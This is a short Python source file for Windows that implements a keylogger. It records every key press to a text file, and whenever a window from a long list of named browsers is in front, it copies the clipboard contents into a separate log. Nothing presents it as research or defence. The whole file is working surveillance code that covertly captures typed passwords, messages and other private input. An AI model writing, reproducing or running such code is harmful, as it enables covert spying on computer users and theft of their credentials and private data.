import win32gui
import win32clipboard
import os
import logging
from pynput.keyboard import Key, Listener

def log_keystrokes(file_path, key):
    """
    Logs keystrokes and captures URLs from browsers.

    :param file_path: The path to the directory where the keystrokes will be saved.
    :param key: The key event to log.
    """
    keystroke_file = os.path.join(file_path, "f_keystroke.txt")
    with open(keystroke_file, "a") as f:
        f.write(f"{key}\n")

    window = win32gui.GetWindowText(win32gui.GetForegroundWindow()).lower()
    browsers = {
        "chrome", "firefox", "safari", "edge", "opera", "internet explorer", "brave", "chromium", "vivaldi",
        "yandex browser", "maxthon", "tor browser", "uc browser", "pale moon", "seamonkey", "avant browser",
        "midori", "epic browser", "comodo dragon", "waterfox", "slimjet", "basilisk", "falkon", "konqueror",
        "blisk", "torch browser", "puffin browser", "sleipnir", "otter browser", "lunascape"
    }

    for browser in browsers:
        if browser in window:
            try:
                win32clipboard.OpenClipboard()
                url = win32clipboard.GetClipboardData(win32clipboard.CF_TEXT)
                win32clipboard.CloseClipboard()
                if url:
                    url = url.decode("utf-8")
                    with open(os.path.join(file_path, "f_website.log"), "a") as f:
                        f.write(f"{url}\n")
            except Exception as e:
                logging.error(f"Error accessing clipboard: {e}")
            break

def start_keylogger(file_path):
    """
    Starts the keylogger and listens for key events.

    :param file_path: The path to the directory where the keystrokes will be saved.
    """
    def on_press(key):
        log_keystrokes(file_path, key)

    def on_release(key):
        if key == Key.esc:
            return False

    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()